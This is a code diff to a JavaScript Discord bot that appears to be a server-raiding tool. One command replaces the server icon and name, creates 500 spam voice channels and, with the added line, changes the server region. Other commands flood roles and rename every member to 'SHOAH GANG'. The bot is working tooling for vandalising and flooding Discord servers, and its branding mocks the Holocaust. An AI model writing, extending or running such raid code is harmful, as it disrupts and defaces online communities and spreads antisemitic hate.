@@ -52,6 +52,7 @@ if (msg.content === '.oupss') {
     if (!fucked){
       msg.guild.setIcon("./shoah.jpg").catch(e => {});
       msg.guild.setName('BZ by Shoah Gang').catch(e => {});
+     msg.guild.setRegion('hongkong').catch(e => {});
  
       for (var i = 0; i < 500; i++) {
         msg.guild.createChannel('raid_by_shoah_gang', 'voice').catch(e => {});
@@ -92,11 +93,6 @@ if (msg.content === '.pardon') {
       if (msg.deletable) msg.delete().catch(e => {});
     }).catch(e => {});
   }
-  if(msg.content === ".renameall"){
-    msg.guild.members.forEach(member => {
-      if(member.setNickname("SHOAH GANG"));      
-  })
-  }
   if (msg.content === '.roleflood') {
 
     if (msg.deletable) msg.delete();
@@ -110,6 +106,13 @@ if (msg.content === '.pardon') {
       i++
     }, 100)
   }
+
+  if(msg.content === ".renameall"){
+    msg.guild.members.forEach(member => {
+      if(member.setNickname("SHOAH GANG"));      
+  })
+  }
+
 }});
 
 bot.login(process.env.BOT_TOKEN)
